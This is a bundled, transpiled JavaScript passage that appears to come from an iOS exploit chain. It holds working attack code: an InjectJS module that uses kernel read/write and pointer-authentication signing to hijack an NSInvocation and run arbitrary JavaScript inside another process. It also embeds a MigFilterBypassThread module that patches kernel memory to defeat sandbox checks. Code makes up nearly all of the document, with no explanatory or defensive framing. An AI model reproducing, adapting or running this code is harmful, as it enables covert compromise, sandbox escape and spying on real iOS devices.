function _checkPrivateRedeclaration(e, t) { if (t.has(e)) throw new TypeError("Cannot initialize the same private elements twice on an object"); }
function _defineProperty(e, r, t) { return (r = _toPropertyKey(r)) in e ? Object.defineProperty(e, r, { value: t, enumerable: !0, configurable: !0, writable: !0 }) : e[r] = t, e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
function _toPrimitive(t, r) { if ("object" != _typeof(t) || !t) return t; var e = t[Symbol.toPrimitive]; if (void 0 !== e) { var i = e.call(t, r || "default"); if ("object" != _typeof(i)) return i; throw new TypeError("@@toPrimitive must return a primitive value."); } return ("string" === r ? String : Number)(t); }
function _classPrivateFieldGet(s, a) { return s.get(_assertClassBrand(s, a)); }
function _classPrivateFieldSet(s, a, r) { return s.set(_assertClassBrand(s, a), r), r; }
function _assertClassBrand(e, t, n) { if ("function" == typeof e ? e === t : e.has(t)) return arguments.length < 3 ? t : n; throw new TypeError("Private element is not present on this object"); }



var TAG = "INJECTJS";
var RTLD_LAZY = 0x1;
var RTLD_DEFAULT = 0xfffffffffffffffen;
var _target = /*#__PURE__*/new WeakMap();
var _injectCode = /*#__PURE__*/new WeakMap();
var _migFilterBypass = /*#__PURE__*/new WeakMap();
var _invokingAddr = /*#__PURE__*/new WeakMap();
var _JSContextClass = /*#__PURE__*/new WeakMap();
var _NSMethodSignatureClass = /*#__PURE__*/new WeakMap();
var _NSInvocationClass = /*#__PURE__*/new WeakMap();
var _invokeUsingIMPSel = /*#__PURE__*/new WeakMap();
var _InjectJS_brand = /*#__PURE__*/new WeakSet();
var InjectJS = /*#__PURE__*/function () {
  function InjectJS(target, injectCode) {
    var migFilterBypass = arguments.length > 2 && arguments[2] !== undefined ? arguments[2] : null;
    _classCallCheck(this, InjectJS);
    _classPrivateMethodInitSpec(this, _InjectJS_brand);
    _defineProperty(this, "task", void 0);
    _classPrivateFieldInitSpec(this, _target, void 0);
    _classPrivateFieldInitSpec(this, _injectCode, void 0);
    _classPrivateFieldInitSpec(this, _migFilterBypass, void 0);
    _classPrivateFieldInitSpec(this, _invokingAddr, void 0);
    _classPrivateFieldInitSpec(this, _JSContextClass, void 0);
    _classPrivateFieldInitSpec(this, _NSMethodSignatureClass, void 0);
    _classPrivateFieldInitSpec(this, _NSInvocationClass, void 0);
    _classPrivateFieldInitSpec(this, _invokeUsingIMPSel, void 0);
    _classPrivateFieldSet(_target, this, target);
    _classPrivateFieldSet(_injectCode, this, injectCode);
    _classPrivateFieldSet(_migFilterBypass, this, migFilterBypass);
    _classPrivateFieldSet(_invokingAddr, this, _assertClassBrand(_InjectJS_brand, this, _findInvoking).call(this));
    _classPrivateFieldSet(_JSContextClass, this, Native.callSymbol("objc_getClass", "JSContext"));
    _classPrivateFieldSet(_NSMethodSignatureClass, this, Native.callSymbol("objc_getClass", "NSMethodSignature"));
    _classPrivateFieldSet(_NSInvocationClass, this, Native.callSymbol("objc_getClass", "NSInvocation"));
    _classPrivateFieldSet(_invokeUsingIMPSel, this, Native.callSymbol("sel_registerName", "invokeUsingIMP:"));
    if (!_classPrivateFieldGet(_invokingAddr, this)) console.log(TAG, "Invoking not found!");
  }
  return _createClass(InjectJS, [{
    key: "inject",
    value: function inject() {
      var agentPid = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : 0;
      if (!_classPrivateFieldGet(_invokingAddr, this)) return false;
      if (typeof _classPrivateFieldGet(_target, this) == "string") {
        console.log(TAG, "Start injecting JS script into ".concat(_classPrivateFieldGet(_target, this)));
        this.task = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_1__["default"](_classPrivateFieldGet(_target, this), _classPrivateFieldGet(_migFilterBypass, this));
        if (!this.task.success()) {
          console.log(TAG, "Unable to inject into: " + _classPrivateFieldGet(_target, this));
          return false;
        }
      } else {
        console.log(TAG, "Start injecting JS script into existing task: ".concat(_classPrivateFieldGet(_target, this).pid()));

        // Assume target is a RemoteCall object
        this.task = _classPrivateFieldGet(_target, this);
        if (!this.task.success()) {
          console.log(TAG, "Unable to inject into existing task");
          return false;
        }
      }
      _assertClassBrand(_InjectJS_brand, this, _startWithTask).call(this, agentPid);
      return true;
    }
  }, {
    key: "destroy",
    value: function destroy() {
      if (this.task && this.task.success()) this.task.destroy();
      this.task = null;
    }
  }]);
}();
function _startWithTask(agentPid) {
  var mem = this.task.mem();
  var krwCtx = this.task.krwCtx();

  // Sign __invoking__ function address
  _classPrivateFieldSet(_invokingAddr, this, this.task.pac(_classPrivateFieldGet(_invokingAddr, this), 0));
  //console.log(TAG, "Signed invoking: " + Utils.hex(this.#invokingAddr));

  this.task.writeStr(mem, "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore");
  var lib = this.task.call(1000, "dlopen", mem, RTLD_LAZY);
  //console.log(TAG, "lib: " + Utils.hex(lib));

  // Create a JSC context and get pointer to exceptionHandler NSBlock
  var jscontext = _assertClassBrand(_InjectJS_brand, this, _callObjcRetain).call(this, _classPrivateFieldGet(_JSContextClass, this), "new");
  //console.log(TAG, "Remote JSC: " + Utils.hex(jscontext));

  var exceptionHandler = this.task.read64(jscontext + 0x28n);
  //console.log(TAG, "Exception handler: " + Utils.hex(exceptionHandler));

  // Register an "invoker()" JS function within our JSC context, having exceptionHandler block as native implementation.
  // We replace exceptionHandler NSInvocation later in this code.
  var invokerStr = _assertClassBrand(_InjectJS_brand, this, _writeCFStr).call(this, mem, "invoker");
  _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, jscontext, "setObject:forKeyedSubscript:", exceptionHandler, invokerStr);
  //console.log(TAG, "invokerStr: " + Utils.hex(invokerStr));

  // Retrieve JSValue of invoker inside JSC context dict
  var invoker = _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, jscontext, "objectForKeyedSubscript:", invokerStr);
  //console.log(TAG, "invoker: " + Utils.hex(invoker));

  // Get pointer of NSInvocation inside NSBlock
  var fjval = this.task.read64(invoker + 0x8n);
  var storval = this.task.read64(fjval + 0x40n);
  var invokerObj = this.task.read64(storval + 0x10n);
  //console.log(TAG, "invokerObj: " + Utils.hex(invokerObj));

  this.task.writeStr(mem, "QQQQQQQQQQQQQQQ");
  var lsignature = _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, _classPrivateFieldGet(_NSMethodSignatureClass, this), "signatureWithObjCTypes:", mem);
  this.task.writeStr(mem, "@QQQQQQQQQQQQQQ");
  var osignature = _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, _classPrivateFieldGet(_NSMethodSignatureClass, this), "signatureWithObjCTypes:", mem);

  // This is an utility NSInvocation object we share with JS to allow objc call with retained return object
  var oinv = _assertClassBrand(_InjectJS_brand, this, _callObjcRetain).call(this, _classPrivateFieldGet(_NSInvocationClass, this), "invocationWithMethodSignature:", osignature);

  // This is the final NSInvocation object we use to call the actual target function
  var inv = _assertClassBrand(_InjectJS_brand, this, _callObjcRetain).call(this, _classPrivateFieldGet(_NSInvocationClass, this), "invocationWithMethodSignature:", lsignature);
  //console.log(TAG, "inv: " + Utils.hex(inv));

  // Create a new NSInvocation and replace the NSBlock one with this
  var jsinv = _assertClassBrand(_InjectJS_brand, this, _callObjcRetain).call(this, _classPrivateFieldGet(_NSInvocationClass, this), "invocationWithMethodSignature:", lsignature);
  //console.log(TAG, "jsinv: " + Utils.hex(jsinv));

  var callBuff = this.task.call(100, "calloc", 1, 0x4000);
  var firstInvokingBuff = callBuff + 0x50n; // callBuff[10]
  var argsBuff = callBuff + 0x320n; // callBuff[100]
  var resultBuff = callBuff + 0x640n; // callBuff[200]

  //console.log(TAG, "callBuff: " + Utils.hex(callBuff));
  //console.log(TAG, "firstInvokingBuff: " + Utils.hex(firstInvokingBuff));
  //console.log(TAG, "argsBuff: " + Utils.hex(argsBuff));
  //console.log(TAG, "resultBuff: " + Utils.hex(resultBuff));

  // Share callBuff with JS
  this.task.writeStr(mem, "nativeCallBuff");
  var jsctx = _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, jscontext, "JSGlobalContextRef");
  var nativeCallBuff = this.task.call(100, "JSObjectMakeArrayBufferWithBytesNoCopy", jsctx, callBuff, 0x4000);
  var globalObject = this.task.call(100, "JSContextGetGlobalObject", jsctx);
  var jsName = this.task.call(100, "JSStringCreateWithUTF8CString", mem);
  this.task.call(100, "JSObjectSetProperty", jsctx, globalObject, jsName, nativeCallBuff);
  var localCallBuff = new BigUint64Array(33);

  // Second (final) __invoking__ arguments
  localCallBuff[0] = 0x41414141n; // this should be overwritten at every function call
  localCallBuff[1] = resultBuff; // Result buffer
  localCallBuff[2] = argsBuff; // Arguments buffer
  localCallBuff[3] = 0x120n; // args buff size. Do not touch!

  // First __invoking__ arguments
  localCallBuff[10] = _classPrivateFieldGet(_invokingAddr, this);
  localCallBuff[11] = resultBuff;
  localCallBuff[12] = callBuff;
  localCallBuff[13] = 0xe0n;

  // Some offsets we export to JS
  localCallBuff[20] = callBuff;
  localCallBuff[21] = this.task.pac(Native.callSymbol("dlsym", RTLD_DEFAULT, "dlsym"), 0);
  localCallBuff[22] = this.task.pac(Native.callSymbol("dlsym", RTLD_DEFAULT, "memcpy"), 0);
  localCallBuff[23] = this.task.pac(Native.callSymbol("dlsym", RTLD_DEFAULT, "malloc"), 0);
  localCallBuff[24] = oinv;
  localCallBuff[25] = jsctx;
  localCallBuff[26] = true ? 1n : undefined; // we pass true if DEBUG is set
  localCallBuff[27] = 1n;
  localCallBuff[28] = 0n;
  localCallBuff[29] = 0n;
  localCallBuff[30] = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].getKernelBase();
  var desiredPacGadget = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__["default"].getPaciaGadget();
  // retreiving correct modifier for 18.4 and above
  if (globalThis.xnuVersion.major == 24 && globalThis.xnuVersion.minor >= 4) {
    desiredPacGadget = Native.pacia(Native.strip(desiredPacGadget), 0n);
  }
  localCallBuff[31] = desiredPacGadget;
  localCallBuff[32] = BigInt(agentPid);

  //console.log(TAG, "dlsym: " + Utils.hex(localCallBuff[21]));
  //console.log(TAG, "memcpy: " + Utils.hex(localCallBuff[22]));
  //console.log(TAG, "malloc: " + Utils.hex(localCallBuff[23]));

  var nativeLocalBuff = Native.callSymbol("malloc", localCallBuff.byteLength);
  Native.write(nativeLocalBuff, localCallBuff.buffer);
  this.task.write(callBuff, nativeLocalBuff, localCallBuff.byteLength);
  Native.callSymbol("free", nativeLocalBuff);
  _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, inv, "setArgument:atIndex:", firstInvokingBuff, 0);
  _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, inv, "setArgument:atIndex:", firstInvokingBuff + 0x8n, 1);
  _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, inv, "setArgument:atIndex:", firstInvokingBuff + 0x10n, 2);
  _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, inv, "setArgument:atIndex:", firstInvokingBuff + 0x18n, 3);

  // This NSInvocation should in turn call the final NSInvocation we created before,
  // but with fully controlled arguments
  this.task.write64(mem, _classPrivateFieldGet(_invokingAddr, this));
  _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, jsinv, "setTarget:", inv);
  _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, jsinv, "setSelector:", _classPrivateFieldGet(_invokeUsingIMPSel, this));
  _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, jsinv, "setArgument:atIndex:", mem, 2);

  // Replace NSInvocation
  this.task.write64(storval + 0x10n, jsinv);
  this.task.write64(storval + 0x18n, 0n);
  //console.log(TAG, "NSInvocation replaced");

  // Write loader.js in remote task
  //const loaderJS = "let buff = new BigUint64Array(this.nativeCallBuff); buff[0] = 0x41414141n; buff[100] = 0x11111111n; invoker();";
  console.log(TAG, "JS script length: " + _classPrivateFieldGet(_injectCode, this).length);
  var scriptMem = this.task.call(100, "calloc", 1, _classPrivateFieldGet(_injectCode, this).length + 1);
  var scriptStr = _assertClassBrand(_InjectJS_brand, this, _writeCFStr).call(this, scriptMem, _classPrivateFieldGet(_injectCode, this));
  this.task.call(100, "free", scriptMem);
  //console.log(TAG, "scriptStr: " + Utils.hex(scriptStr));

  // Check if we write ok
  // console.log(TAG,"Check if we write ok" )
  // const a = Native.callSymbol("malloc", this.#injectCode.length + 1);
  // const len = this.#callObjc(scriptStr, "length");
  // console.log(TAG, len);
  // const b = this.#callObjc(scriptStr, "UTF8String");
  // this.task.read(b, a, this.#injectCode.length + 1);
  // const c = Native.readString(a, this.#injectCode.length);
  // console.log(TAG, c);

  //const loaderStr = this.#writeCFStr(mem, "loader");
  //this.#callObjc(jscontext, "setObject:forKeyedSubscript:", scriptStr, loaderStr);
  //console.log(TAG, "loaderStr: " + Utils.hex(loaderStr));

  console.log(TAG, "Starting JS script for target: " + _classPrivateFieldGet(_target, this));

  //const evaluateStr = this.#writeCFStr(mem, "let buff = new BigUint64Array(this.nativeCallBuff); buff[0] = 0x41414141n; buff[100] = 0x11111111n; invoker();");
  //const evaluateStr = this.#writeCFStr(mem, "invoker();");
  //const evaluateStr = this.#writeCFStr(mem, "eval(loader);");
  //const evaluateStr = this.#writeCFStr(mem, scriptStr);
  _assertClassBrand(_InjectJS_brand, this, _callObjcInBackground).call(this, jscontext, "evaluateScript:", scriptStr);
  //this.#callObjcInBackground(jscontext, "evaluateScript:", scriptStr);
  //this.#callObjc(jscontext, "evaluateScript:", evaluateStr);

  // Read data from result
  //const retVal = this.task.read64(resultBuff);
  //console.log(TAG, "Result: " + retVal);

  console.log(TAG, "All done!");
  return true;
}
function _findInvoking() {
  //console.log(TAG, "Find 'invoking()'...");

  var startAddr = Native.dlsym("_CF_forwarding_prep_0");
  startAddr = startAddr & 0x7fffffffffn; //Chain.strip(startAddr);
  //console.log(TAG, "startAddr: " + Utils.hex(startAddr));

  if (!startAddr) return 0;
  if (xnuVersion.major == 24 && xnuVersion.minor >= 5) startAddr -= 0x2500n;else startAddr -= 0x4000n;
  var pattern = new Uint8Array([0x67, 0x1D, 0x40, 0xF9, 0x66, 0x19, 0x40, 0xF9, 0x65, 0x15, 0x40, 0xF9, 0x64, 0x11, 0x40, 0xF9]);
  Native.write(Native.mem, pattern.buffer);
  var foundAddr = Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16);
  //console.log(TAG, "foundAddr: " + Utils.hex(foundAddr));

  if (!foundAddr) {
    // special case for iOS 17.4-17.4.1
    //console.log(TAG,`Didnt found invoking,trying to find it for special version`);
    startAddr = Native.dlsym("CFCharacterSetIsCharacterMember");
    startAddr = startAddr & 0x7fffffffffn;
    foundAddr = Native.callSymbol("memmem", startAddr, 0x4000, Native.mem, 16);
    //console.log(TAG,`foundAddr:${Utils.hex(foundAddr)}`);
    if (!foundAddr) return 0;
  }
  var buff = Native.read(foundAddr - BigInt(Native.memSize), Native.memSize);
  var buff32 = new Uint32Array(buff);
  for (var i = buff32.length - 1; i >= 0; i--) {
    foundAddr -= 0x4n;
    if (buff32[i] == 0xd503237f) {
      var found = foundAddr;
      console.log(TAG, "Invoking found: " + libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(found));
      return found;
    }
  }
  return 0;
}
function _callObjc(obj, selName) {
  var _this$task;
  var sel = Native.callSymbol("sel_registerName", selName);
  for (var _len = arguments.length, args = new Array(_len > 2 ? _len - 2 : 0), _key = 2; _key < _len; _key++) {
    args[_key - 2] = arguments[_key];
  }
  return (_this$task = this.task).call.apply(_this$task, [1000, "objc_msgSend", obj, sel].concat(args));
}
function _callObjcRetain(obj, selName) {
  var _assertClassBrand2;
  for (var _len2 = arguments.length, args = new Array(_len2 > 2 ? _len2 - 2 : 0), _key2 = 2; _key2 < _len2; _key2++) {
    args[_key2 - 2] = arguments[_key2];
  }
  var ret = (_assertClassBrand2 = _assertClassBrand(_InjectJS_brand, this, _callObjc)).call.apply(_assertClassBrand2, [this, obj, selName].concat(args));
  _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, ret, "retain");
  return ret;
}
function _callObjcInBackground(obj, selName) {
  var _this$task2;
  var performSelectorInBackground = Native.callSymbol("sel_registerName", "performSelectorInBackground:withObject:");
  var sel = Native.callSymbol("sel_registerName", selName);
  for (var _len3 = arguments.length, args = new Array(_len3 > 2 ? _len3 - 2 : 0), _key3 = 2; _key3 < _len3; _key3++) {
    args[_key3 - 2] = arguments[_key3];
  }
  return (_this$task2 = this.task).call.apply(_this$task2, [1000, "objc_msgSend", obj, performSelectorInBackground, sel].concat(args));
}
function _writeCFStr(dst, str) {
  var kCFStringEncodingUTF8 = 0x08000100;
  this.task.writeStr(dst, str);
  return this.task.call(100, "CFStringCreateWithCString", 0, dst, kCFStringEncodingUTF8);
}
function _printClass(obj) {
  var cl = _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, obj, "class");
  var desc = _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, cl, "description");
  var str = _assertClassBrand(_InjectJS_brand, this, _callObjc).call(this, desc, "UTF8String");
  this.task.read(str, Native.mem, 32);
  var classDesc = Native.readString(Native.mem);
  console.log(TAG, "class: " + classDesc);
}


/***/ }),

/***/ "./MigFilterBypassThread.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony default export */ __webpack_exports__["default"] = ("import Native from \"libs/Chain/Native\";\nimport Chain from \"libs/Chain/Chain\";\nimport Task from \"libs/TaskRop/Task\";\nimport Thread from \"libs/TaskRop/Thread\";\nimport TaskRop from \"libs/TaskRop/TaskRop\";\nimport Logger from \"libs/JSUtils/Logger\";\nimport Utils from \"libs/JSUtils/Utils\";\nimport DriverNewThread from \"libs/Driver/DriverNewThread\";\n\n\n\nconst TAG = \"MIG_FILTER_BYPASS\";\n\nconst RUN_FLAG_STOP = 0;\nconst RUN_FLAG_RUN = 1;\nconst RUN_FLAG_PAUSE = 2;\n\nfunction disarm_gc() {\n\n\tlet vm = uread64(uread64(addrof(globalThis) + 0x10n) + 0x38n);\n\tlet heap = vm + 0xc0n;\n\tlet m_threadGroup = uread64(heap + 0x198n);\n\tlet threads = uread64(m_threadGroup);\n\tuwrite64(threads + 0x20n, 0x0n);\n\t// LOG(\"[+] gc disarmed\");\n}\n\nfunction kstrip(addr) {\n\treturn addr | 0xffffff8000000000n;\n}\n\nfunction lockSandboxLock() {\n\t// Find \"_duplicate_lock\" address, which is a \"lck_rw_t\"\n\tconst lockAddr = Chain.getKernelBase() + migLock;\n\tconst sbxMessageAddr = Chain.getKernelBase() + migSbxMsg;\n\n\t//console.log(TAG, \"kernelSlide: \" + Utils.hex(kernelSlide));\n\t//console.log(TAG, \"lockAddr: \" + Utils.hex(lockAddr));\n\t//console.log(TAG, \"sbxMessageAddr: \" + Utils.hex(sbxMessageAddr));\n\n\tlet lockBuff = Chain.readBuff(lockAddr, 16);\n\tlet lockBuff32 = new Uint32Array(lockBuff);\n\t//for (let i=0, j=0; i<16; i+=4, j++)\n\t//\tconsole.log(TAG, `${Utils.hex(i)}: ${Utils.hex(lockBuff32[j]).padStart(8, '0')}`);\n\n\tlet lockData = lockBuff32[2];\n\tlockData |= 0x410000;\t// interlock + can_sleep\n\tChain.write32(lockAddr + 0x8n, lockData);\n\n\t// Do we need to clear this addr while locking too? Or maybe just when we unlock is enough?\n\tChain.write64(sbxMessageAddr, 0n);\n}\n\nfunction unlockSandboxLock() {\n\tconst lockAddr = Chain.getKernelBase() + migLock;\n\tconst sbxMessageAddr = Chain.getKernelBase() + migSbxMsg;\n\n\t\n\t// clear the sbx message buffer (pointer) used to check for duplicate messages.\n\t// This should solve an issue with sfree() if we unlock and lock sandbox quick enough.\n\tChain.write64(sbxMessageAddr, 0n);\n\n\tlet lockBuff = Chain.readBuff(lockAddr, 16);\n\tlet lockBuff32 = new Uint32Array(lockBuff);\n\n\tlet lockData = lockBuff32[2];\n\tlockData &= ~0x10000;\t// interlock\n\tChain.write32(lockAddr + 0x8n, lockData);\n}\n\nfunction dumpKMem(addr, size) {\n\tChain.read(addr, Native.mem, size);\n\tlet buff = Native.read(Native.mem, size);\n\tlet buff64 = new BigUint64Array(buff);\n\tfor (let i=0, j=0; i<size; i+=8, j++) {\n\t\tlet bits = buff64[j] & 0xfffn;\n\t\tif (bits === 0x4a4n)\n\t\t\tconsole.log(TAG, `[${Utils.hex(addr + BigInt(i))}] ${Utils.hex(i)}: ${Utils.hex(buff64[j]).padStart(16, '0')} <<< FOUND ?`);\n\t\telse\n\t\t\tconsole.log(TAG, `[${Utils.hex(addr + BigInt(i))}] ${Utils.hex(i)}: ${Utils.hex(buff64[j]).padStart(16, '0')}`);\n\t}\n}\n\nfunction findReturnValueOffs(addr) {\n\t// Read from thread kstack, page aligned\n\tconst READ_SIZE = 0x1000;\n\t//Chain.read(addr, Native.mem, READ_SIZE);\n\tlet pageAddr = Task.trunc_page(addr);\n\tlet startAddr = pageAddr + 0x3000n;\n\tlet buff = Chain.readBuff(startAddr, READ_SIZE);\n\tif (!buff)\n\t\treturn false;\n\tlet buff64 = new BigUint64Array(buff);\n\tlet expectedLR = Chain.getKernelBase() + migKernelStackLR;\n\n\t// Look for 0xxxxxxxxxxxxxx4a4 value, which should be the LSB of LR pointing to Sandbox.kext inside\n\t// \"_sb_evaluate_internal()\", so meaning we found the function stack we need (_sb_eval).\n\tfor (let i=0, j=0; i<READ_SIZE; i+=8, j++) {\n\t\tlet val = kstrip(buff64[j]);\n\t\tif (val === expectedLR) {\n\t\t\t//console.log(TAG, `Matching LR found at ${Utils.hex(startAddr + BigInt(i))}: ${Utils.hex(buff64[j])}`);\n\n\t\t\t// The return value of _eval() is stored in the stack at -40 bytes from LR.\n\t\t\tlet offs = startAddr + BigInt(i - 40);\n\t\t\treturn offs;\n\t\t}\n\t}\n\treturn false;\n}\n\nfunction disableFilterOnThread(threadAddr) {\n\t//console.log(TAG, \"Read kstack of thread: \" + Utils.hex(threadAddr));\n\tlet kstack = Thread.getStack(threadAddr);\n\tif (!kstack)\n\t\treturn false;\n\n\tkstack = kstrip(kstack);\n\tlet kernelSPOffset = BigInt(Utils.UINT64_SIZE * 12);\n\tlet kernelSP = Chain.read64(kstack + kernelSPOffset);\n\tif (!kernelSP)\n\t\treturn false;\n\n\t//console.log(TAG, \"kstack:   \" + Utils.hex(kstack));\n\t//console.log(TAG, \"kernelSP: \" + Utils.hex(kernelSP));\n\n\t//dumpKMem(kstack, 0x70);\n\t//dumpKMem(kernelSP, 0x1000);\n\n\t//console.log(TAG, \"Possible MIG syscall with thread: \" + Utils.hex(threadAddr));\n\n\tlet offs = findReturnValueOffs(kernelSP);\n\tif (!offs) {\n\t\t//console.log(TAG, \"Unable to find offset\");\n\t\treturn false;\n\t}\n\n\t//console.log(TAG, \"Offs found at: \" + Utils.hex(offs));\n\n\tChain.write64(offs, 0n);\n\n\tconsole.log(TAG, \"MIG syscall intercepted for thread: \" + Utils.hex(threadAddr));\n\n\treturn true;\n}\n\nfunction waitForMigSyscall(selfTaskAddr, runBypassFlagPtr, timeout=5000) {\n\t//console.log(TAG, \"Wait for MIG syscall...\");\n\tlet startTimestamp = Date.now();\n\n\twhile (true) {\n\t\tlet runBypassFlag = Native.read32(runBypassFlagPtr);\n\t\tif (!runBypassFlag)\n\t\t\treturn RUN_FLAG_STOP;\n\t\tif (runBypassFlag == RUN_FLAG_PAUSE)\n\t\t\treturn RUN_FLAG_PAUSE;\n\n\t\tif (timeout && (Date.now() - startTimestamp >= timeout)) {\n\t\t\tconsole.log(TAG, \"Timeout waiting for a syscall\");\n\t\t\tbreak;\n\t\t}\n\n\t\tlet filterTriggered = false;\n\t\tlet monitorThread1 = monitorThread1Ptr ? Native.read64(monitorThread1Ptr) : false;\n\t\tlet monitorThread2 = monitorThread2Ptr ? Native.read64(monitorThread2Ptr) : false;\n\n\t\tif (monitorThread1 && monitorThread2) {\n\t\t\t//console.log(TAG, \"check monitored threads\");\n\t\t\tfilterTriggered |= disableFilterOnThread(monitorThread1);\n\t\t\tfilterTriggered |= disableFilterOnThread(monitorThread2);\n\t\t}\n\t\telse {\n\t\t\t//console.log(TAG, \"Waiting for monitored threads...\");\n\t\t}\n\t\t\n\t\tif (filterTriggered)\n\t\t\tbreak;\n\n\t\t//console.log(TAG, \"No MIG syscall detected\");\n\n\t\tNative.callSymbol(\"usleep\", 50000);\n\t}\n\t//console.log(TAG, \"MIG syscall intercepted!\");\n\treturn RUN_FLAG_RUN;\n}\n\nfunction startFilterBypass(runBypassFlagPtr) {\n\tlet run = RUN_FLAG_PAUSE;\n\n\tlet selfTaskAddr = Task.gSelfTask.addr;\n\n\twhile (run) {\n\t\tif (run == RUN_FLAG_PAUSE) {\n\t\t\tconsole.log(TAG, \"Pausing filter bypass\");\n\t\t\twhile (true) {\n\t\t\t\trun = Native.read32(runBypassFlagPtr);\n\t\t\t\tif (run != RUN_FLAG_PAUSE) {\n\t\t\t\t\tif (run == RUN_FLAG_RUN)\n\t\t\t\t\t\tconsole.log(TAG, \"Resuming filter bypass\");\n\t\t\t\t\tbreak;\n\t\t\t\t}\n\t\t\t\tNative.callSymbol(\"usleep\", 100000);\n\t\t\t}\n\t\t}\n\n\t\t//console.log(TAG, \"Locking sandbox...\");\n\t\tlockSandboxLock();\n\t\t//console.log(TAG, \"Sandbox locked\");\n\n\t\trun = waitForMigSyscall(selfTaskAddr, runBypassFlagPtr, 5000);\n\n\t\tunlockSandboxLock();\n\t\t//console.log(TAG, \"Sandbox unlocked\");\n\n\t\tif (run)\n\t\t\tNative.callSymbol(\"sched_yield\");\n\t}\n}\n\ndisarm_gc();\n\n// Register log function\n//globalThis.LOG_POST_TO_FILE = false;\nconsole.log = Logger.log;\n\nconsole.log(TAG, \"Thread initialized!\");\n\nlet kernelControlPtr = thread_arg;\nlet kernelRWPtr = thread_arg + 0x8n;\nlet kernelBasePtr = thread_arg + 0x10n;\nlet mainThreadAddrPtr = thread_arg + 0x18n;\nlet runBypassFlagPtr = thread_arg + 0x20n;\nlet isRunningPtr = thread_arg + 0x28n;\nlet mutexPtr = thread_arg + 0x30n;\nlet migLockPtr = thread_arg + 0x38n;\nlet migSbxMsgPtr = thread_arg + 0x40n;\nlet migKernelStackLRPtr = thread_arg + 0x48n;\nlet monitorThread1Ptr = thread_arg + 0x50n;\nlet monitorThread2Ptr = thread_arg + 0x58n;\n\nlet kernelControl = uread64(kernelControlPtr);\nlet kernelRW = uread64(kernelRWPtr);\nlet kernelBase = uread64(kernelBasePtr);\nlet mainThreadAddr = uread64(mainThreadAddrPtr);\nrunBypassFlagPtr = uread64(runBypassFlagPtr);\nisRunningPtr = uread64(isRunningPtr);\nlet mutex = uread64(mutexPtr);\nlet migLock = uread64(migLockPtr);\nlet migSbxMsg = uread64(migSbxMsgPtr);\nlet migKernelStackLR = uread64(migKernelStackLRPtr);\nmonitorThread1Ptr = uread64(monitorThread1Ptr);\nmonitorThread2Ptr = uread64(monitorThread2Ptr);\n\nconsole.log(TAG, \"kernelControl:     \" + kernelControl);\nconsole.log(TAG, \"kernelRW:          \" + kernelRW);\nconsole.log(TAG, \"kernelBase:        \" + Utils.hex(kernelBase));\nconsole.log(TAG, \"mainThreadAddr:    \" + Utils.hex(mainThreadAddr));\nconsole.log(TAG, \"runBypassFlagPtr:  \" + Utils.hex(runBypassFlagPtr));\nconsole.log(TAG, \"isRunningPtr:      \" + Utils.hex(isRunningPtr));\nconsole.log(TAG, \"mutex:             \" + Utils.hex(mutex));\nconsole.log(TAG, \"migLock:           \" + Utils.hex(migLock));\nconsole.log(TAG, \"migSbxMsg:         \" + Utils.hex(migSbxMsg));\nconsole.log(TAG, \"migKernelStackLR:  \" + Utils.hex(migKernelStackLR));\nconsole.log(TAG, \"monitorThread1Ptr: \" + Utils.hex(monitorThread1Ptr));\nconsole.log(TAG, \"monitorThread2Ptr: \" + Utils.hex(monitorThread2Ptr));\n\ntry {\n\tlet driver = new DriverNewThread(kernelControl, kernelRW, kernelBase);\n\tChain.init(driver, mutex);\n\tChain.testKRW();\n\tTaskRop.init();\n\n\tconsole.log(TAG, \"Chain initialized\");\n\n\tNative.write32(isRunningPtr, 1);\n\n\tstartFilterBypass(runBypassFlagPtr);\n\n\tconsole.log(TAG, \"Terminating bypass thread\");\n}\ncatch (error) {\n\tconsole.log(TAG, \"Error: \" + error);\n\tconsole.log(TAG, \"\" + error.stack);\n}");

/***/ }),

/***/ "./libs/Chain/Chain.js":
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "default", function() { return Chain; });
/* harmony import */ var _JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__("./libs/JSUtils/Utils.js");
function _typeof(o) { "@babel/helpers - typeof"; return _typeof = "function" == typeof Symbol && "symbol" == typeof Symbol.iterator ? function (o) { return typeof o; } : function (o) { return o && "function" == typeof Symbol && o.constructor === Symbol && o !== Symbol.prototype ? "symbol" : typeof o; }, _typeof(o); }
var _Chain;
function _classCallCheck(a, n) { if (!(a instanceof n)) throw new TypeError("Cannot call a class as a function"); }
function _defineProperties(e, r) { for (var t = 0; t < r.length; t++) { var o = r[t]; o.enumerable = o.enumerable || !1, o.configurable = !0, "value" in o && (o.writable = !0), Object.defineProperty(e, _toPropertyKey(o.key), o); } }
function _createClass(e, r, t) { return r && _defineProperties(e.prototype, r), t && _defineProperties(e, t), Object.defineProperty(e, "prototype", { writable: !1 }), e; }
function _toPropertyKey(t) { var i = _toPrimitive(t, "string"); return "symbol" == _typeof(i) ? i : i + ""; }
